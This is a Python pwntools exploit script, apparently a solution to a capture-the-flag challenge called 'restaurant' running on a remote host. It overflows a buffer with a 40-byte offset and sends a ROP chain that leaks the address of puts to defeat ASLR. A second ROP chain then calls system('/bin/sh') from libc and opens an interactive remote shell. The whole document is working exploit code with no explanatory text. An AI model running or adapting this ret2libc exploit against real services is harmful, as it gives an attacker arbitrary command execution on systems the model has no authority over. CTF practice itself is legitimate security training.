#!/bin/python

from pwn import *
import os
import time 

context.clear(arch="amd64")

host = "138.68.189.41"
port = 31280

elf = ELF("./restaurant")
com = remote(host, port)

libc = ELF("libc.so.6")
rop = ROP(elf)

rop.call((rop.find_gadget(["ret"]))[0])
rop.call(elf.plt["puts"], [next(elf.search(b"\n\x00"))])
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["fill"])

offset = 40 # manual discovery

payload = [
	b"A"*offset,
	rop.chain()
]

payload = b"".join(payload)

com.recvuntil(b"> ")
log.progress("Sending menu choice (1)...")
com.sendline(b"1") 			# choosing first option

com.recvuntil(b"> ")
log.progress("Sending leak payload...")
com.sendline(payload)
time.sleep(0.5)

log.progress("Receiving junk ...")
print(com.recvline())
print(com.recvline())
print(com.recvline())

log.success("Leak received !")
leak = u64(com.recvuntil(b"\n").strip().ljust(8, b"\x00"))

log.info("Puts leaked address @ {}".format(hex(leak)))

libc.address = leak - libc.symbols["puts"]

rop = ROP(libc)

rop.call(rop.find_gadget(["ret"]))
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])

payload = [
	b"A" * 40,
	rop.chain()
]

payload = b"".join(payload)

com.clean()

log.progress("Sending second payload...")
com.sendline(payload)
time.sleep(0.5)

log.critical("Going interactive")
com.interactive()

